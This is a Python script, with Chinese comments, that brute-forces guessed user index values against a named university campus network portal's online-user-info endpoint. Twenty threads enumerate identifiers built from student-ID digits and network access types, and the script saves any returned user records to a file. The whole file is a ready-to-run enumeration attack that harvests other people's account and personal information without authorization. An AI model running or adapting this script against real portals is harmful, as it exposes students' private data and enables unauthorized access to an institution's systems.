import requests,random,time,os,threading

class GetInfo(object):
    def __init__(self,userIndex):
        self.url = "http://portal.swust.edu.cn/eportal/InterFace.do?method=getOnlineUserInfo"
        self.userIndex = userIndex
        self.headers={"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"}

    def getinfo(self):
        res = requests.post(self.url,headers=self.headers,data={"userIndex":self.userIndex})
        res.encoding="utf-8"
        return res.text

def userIndexGen(ident):
    prefix = "30613532373163316135396430313232616631323931386332323865396334315f31302e313"
    list = [x for x in range(10)]

    # 入学年份 从 14 - 17 年,也可以改成15 - 17年  因为14年的很多都不在学校了。
    for i in range(5,8):
        # 学号第一位
        for j in list:
            # 学号第2位
            for k in list:
                # 学号第3位
                for p in list:
                    # 学号第4位
                    for z in list:
                        userIndex = prefix+ident+"13"+str(i)+"3"+str(j)+"3"+str(k)+"3"+str(p)+"3"+str(z)
                        yield userIndex

def run(gen):
    while True:
        try:
            userIndex = gen.__next__()
        except:
            break
        info = GetInfo(userIndex)
        infom = info.getinfo()
        print("[+] 正在尝试",userIndex)
        if "获取用户信息失败" not in infom:
            print("[+] 获取用户信息成功")
            with open(os.path.dirname(__file__)+"\\Success.txt","w") as file:
                file.write(infom)
        time.sleep(random.random())

if __name__ == '__main__':
    """
        =======================设置区===========================
    """

    # 线程数量
    threadNum = 20
    # 接入方式标识符
    #ident = "02e342e31365f353132303" #PC+网线直连
    #ident = "62e3230302e3138335f353132303" #PC+WIFI
    #ident = "62e3133362e385f353132303"   #苹果+WIFI
    ident = "62e35322e3233355f353132303" #安卓+WIFI

    """
        =====================设置区结束==========================
    """
    userIndex = userIndexGen(ident)
    #print(userIndex.__next__())
    threads = []
    for i in range(threadNum):
        thread = threading.Thread(target=run,args=(userIndex,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print()
    print("[+] 已经爬取完成，结果保存在Success.txt")
